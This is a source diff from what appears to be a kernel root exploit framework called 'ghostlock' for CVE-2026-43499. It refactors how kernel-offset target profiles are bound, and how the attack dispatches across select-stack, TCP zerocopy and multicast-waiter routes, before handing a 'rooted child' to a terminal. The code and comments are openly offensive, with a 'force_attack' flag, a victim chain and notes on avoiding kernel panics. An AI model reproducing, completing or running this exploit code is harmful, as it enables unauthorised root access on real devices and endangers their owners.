@@ -11,15 +11,25 @@
 #include "backend/cve_2026_43499_backend.hpp"
 #include "backend/cve_2026_43499_state.hpp"
 
+#include "backend/cve_2026_43499/backend_profile.hpp"
 #include "backend/cve_2026_43499/bootstrap.hpp"
+#include "profile/document.hpp"
 #include "backend/cve_2026_43499/route/route_policy.hpp"
 #include "platform/runtime.hpp"
 #include "terminal/root_script.hpp"
-#include "common.h"
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include "kernelsnitch/utils.h"
+#include "backend/cve_2026_43499/route/route_api.hpp"
+#include "support/timing.hpp"
+
 #include "support/fatal_error.hpp"
 #include "support/decls.hpp"
 #include "terminal/handoff_probe.hpp"
 
+#include <array>
 #include <utility>
 
 namespace ghostlock::backend {
@@ -31,9 +41,8 @@ namespace ghostlock::backend {
     using ghostlock::session::VictimChain;
     namespace {
         /* Stage: process setup and profile installation (middleware-free). */
-        StageResult run_setup(CoreSession &session,
-                              const profile::kernel_offsets &decoded,
-                              const char *debug_dir, bool force_attack) {
+        StageResult run_setup(CoreSession &session, const char *debug_dir,
+                              bool force_attack) {
             ghostlock::backend::cve43499_state(session).heap.init();
             support::disable_rseq_for_thread();
             memory::set_unbuffer();
@@ -46,8 +55,9 @@ namespace ghostlock::backend {
             }
             if (debug_dir && debug_dir[0])
                 config::runtime_config_snapshot().debug_dir = debug_dir;
-            if (!ghostlock::backend::cve43499_state(session).profile.loaded())
-                install_profile(decoded);
+            /* state_from already bound the Document and installed the frozen
+             * TargetProfile; this validates the running kernel and logs. */
+            install_profile();
             /* Robustness guard: running the attack where KernelSU already owns root
              * drives the re-enforce path that panics the kernel at the first PI
              * route, and the objective is already met. Bail out cleanly instead; a
@@ -77,13 +87,28 @@ namespace ghostlock::backend {
         }
     } // namespace
 
+    template <class StepSet>
+    profile::BindStatus Cve2026_43499Backend<StepSet>::state_from(
+            CoreSession &session, const profile::Document &document) {
+        std::array<char, 256> release_buf{};
+        profile::kernel_offsets values{};
+        const uint8_t route = static_cast<uint8_t>(document.middleware);
+        const profile::BindStatus status =
+                ghostlock::backend::cve_2026_43499::backend_profile::bind(
+                        document, route, &values, release_buf.data(),
+                        release_buf.size());
+        if (!status.ok()) return status;
+        ghostlock::backend::cve43499_state(session).profile =
+                profile::TargetProfile::from(&values);
+        return status;
+    }
+
     /* setup -> StepSet::run<Route> -> transfer the rooted child to the terminal. */
     template <class StepSet>
     StageResult Cve2026_43499Backend<StepSet>::run(CoreSession &session,
-                                                   const profile::kernel_offsets &decoded,
                                                    const char *debug_dir, bool force_attack,
                                                    ghostlock::terminal::RootedChild &out) {
-        switch (run_setup(session, decoded, debug_dir, force_attack)) {
+        switch (run_setup(session, debug_dir, force_attack)) {
             case StageResult::Failed:
                 return StageResult::Failed;
             case StageResult::Done:
@@ -94,14 +119,14 @@ namespace ghostlock::backend {
 
         VictimChain chain{};
         StageResult result;
-        switch (decoded.route) {
-            case profile::kRouteSelectStack:
+        switch (ghostlock::backend::cve43499_state(session).profile.route()) {
+            case profile::RouteKind::SelectStack:
                 result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(session, chain);
                 break;
-            case profile::kRouteTcpZerocopy:
+            case profile::RouteKind::TcpZerocopy:
                 result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(session, chain);
                 break;
-            case profile::kRouteMulticastWaiter:
+            case profile::RouteKind::MulticastWaiter:
                 result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(session, chain);
                 break;
             default:
